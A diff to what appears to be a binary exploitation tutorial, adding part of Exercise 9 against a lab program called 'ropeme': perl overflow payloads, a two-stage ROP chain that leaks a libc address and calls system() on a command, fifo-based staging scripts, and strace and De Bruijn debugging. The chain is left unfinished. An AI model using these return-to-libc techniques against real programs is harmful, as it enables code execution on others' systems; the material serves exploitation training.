@@ -595,7 +595,7 @@ There it is!
 Exercise 9
 ==========
 
-In the previous exercise we got the address of the system command.
+In the previous exercise we got the address of the system() function.
 
 Of course having it for a paste instance is quite useless, we must now find
 a way to use it without quitting the process. There are two strategies:
@@ -603,6 +603,160 @@ either we stay within the program and build the address by using ROP gadgets
 astuciously, either we consider use the program as a server, have it output
 the address, compute the offset outside the process and then have the process
 read the new address back.
+
+We will then need to put our string command somewhere and call system() on it.
+
+First let's adapt our previous system-printing command to output the address
+with the offset in a usable form:
+
+::
+
+    $ perl -e 'print "A"x92 . "\xa0\x83\x04\x08\x2c\x85\x04\x08\xa0\x99\x04\x08"'\
+      | ./ropeme admin42 \
+      | xxd \
+      | cut -d ' ' -f 2,3 \
+      | sed -n '3s/\(....\) \(....\)/0x\2\1-0x3fdc0/p' \
+      | rax2 -n \
+      | sed 's/\(..\)/\\x\1/g ; s/^.*$/"\1"/'
+    "\xad\x22\x4c\xf7"
+    Segmentation fault (core dumped)
+
+Remember when we flushed the output? It turns out we call read() just after
+that in the same conditions as our first call. We can use that! We will
+modify our payload from exercise 6 to put our command ("/bin/touch /tmp/ok")
+in the .dynamic section then call system() on it. This is what we want to
+send:
+
+::
+
+    // End of stage 2 which spawns a shell
+    | "/bin/sh\x00" (not on stack but read from stdin)
+    ^ [padding           ] = 'C' x 388
+    | [string     address] = 0x08049712
+    | [end        address] = 0x00000000
+    | [system     address] = 0x????????
+    | [string     len    ] = 0x00000008
+    | [string     address] = 0x08049712
+    | [stdin      fd     ] = 0x00000000
+    | [pppr       address] = 0x080486a9
+    | [read       address] = 0x08048380
+    | [padding           ] = 'B' x 92
+    // End of stage 1 which prints the dynamic address of strcmp
+    ^ [strcmp GOT address] = 0x080499a0
+    | [flushing   address] = 0x0804852c
+    | [puts       address] = 0x080483a0
+    | [padding           ] = 'A' x 92
+
+The problem is, how can we differentiate the two stages? A solution is to use
+a fifo to "serverize" our program: we will write into the fifo from different
+processes and the fifo will be the only input to ropeme. We will write in the
+fifo the stage 1, get the address as output, compute the new address, the new
+payload and write that payload in the fifo to send it to ropeme before it
+crashes.
+
+Also, note that we can't just dive into a shell as our stdin and stdout are
+taken by the fifo. That's why we aren't trying to execute /bin/sh right on.
+
+::
+
+    $ mkfifo fifo
+    $ stage1() {
+        perl -e 'print "A" x 92
+        . "\xa0\x83\x04\x08"
+        . "\x2c\x85\x04\x08"
+        . "\xa0\x99\x04\x08"'
+    }
+    $ stage2() {
+        read addr
+        perl -e 'print "B" x 92
+        . "\x80\x83\x04\x08"
+        . "\xa9\x86\x04\x08"
+        . "\x00\x00\x00\x00"
+        . "\x12\x97\x04\x08"
+        . "\x14\x00\x00\x00"' \
+        -e ". \"$addr\"" -e '
+        . "\x00\x00\x00\x00"
+        . "\x12\x97\x04\x08"
+        . "C" * 388
+        . "/bin/touch /tmp/ok\x00"'
+    }
+    $ decode_address() {
+        sed '1,2d' \
+        | xxd \
+        | cut -d ' ' -f 2,3 \
+        | sed -n 's/\(..\)\(..\) \(..\)\(..\)/0x\4\3\2\1-0x3fdc0/p' \
+        | rax2 -n \
+        | sed 's/\(..\)/\\\\x\1/g ; s/^\(.*\)$/"\1"/'
+    }
+    $ > fifo & # Keep the fifo open from one write to the other
+    $ stage1 > fifo
+    $ echo > fifo   # Flush
+
+    # In another terminal
+    $ cat fifo | ./ropeme admin42 | decode_address
+    "\\xf0\\xc2\\x69\\xf7"
+
+    $ echo "\\xf0\\xc2\\x69\\xf7" | stage2 > fifo
+    Segmentation fault (core dumped)   (in the ropeme terminal)
+
+Hmm... It doesn't work. Let's debug using a bit of strace magic:
+
+::
+
+    $ stage1 > fifo
+    # Do the ropeme command there
+    $ echo > fifo
+    $ echo > fifo
+
+    # In another terminal
+    $ cat fifo | strace ./ropeme admin42 | decode_address
+    [ Process PID=8926 runs in 32 bit mode. ]
+    read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\206\1\0004\0\0\0"..., 512) = 512
+    read(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 512) = 104
+    read(0, 0x414140e9, 512)                = -1 EFAULT (Bad address)
+    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x414140d8} ---
+    +++ killed by SIGSEGV (core dumped) +++
+    "\\xf0\\x22\\x6c\\xf7"
+    Segmentation fault (core dumped)
+
+So it seems that after the call to fflush our stack isn't in good enough a
+shape to be used by read. It tries to read into the buffer at address
+0x414140e9 and then jumps to the address 0x414140d8 or so it seems. Some more
+tests show that thoses numbers are constant. The "0x4141" part looks like our
+first padding, can we find the offset? Yes using a De Bruijn sequence:
+
+::
+
+    $ { ragg2 -P 92 \
+      | rax2 -s - ;
+        perl -e 'print "\xa0\x83\x04\x08"
+                     . "\x2c\x85\x04\x08"
+                     . "\xa0\x99\x04\x08"'
+      } > fifo
+    $ echo > fifo
+    $ echo > fifo
+
+    # In another terminal
+    $ cat fifo | strace ./ropeme admin42 | decode_address
+    [ Process PID=26649 runs in 32 bit mode. ]
+    read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\206\1\0004\0\0\0"..., 512) = 512
+    read(0, "AAABAACAADAAEAAFAAGAAHAAIAAJAAKA"..., 512) = 104
+    read(0, 0x416540e9, 512)                = -1 EFAULT (Bad address)
+    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x416540d8} ---
+    +++ killed by SIGSEGV (core dumped) +++
+    "\\xf0\\x52\\x64\\xf7"
+    Segmentation fault (core dumped)
+
+A bit of r2 magic:
+
+::
+
+    $ r2 -c "woO 0x4165" -q --
+    90
+
+So the last to bytes of our padding are the beginning of the address... We
+do not control the last two bytes of that address but the beginning may be
+enough. We must now find a way to regain control over the flow.
 
 Exercise 10
 ===========
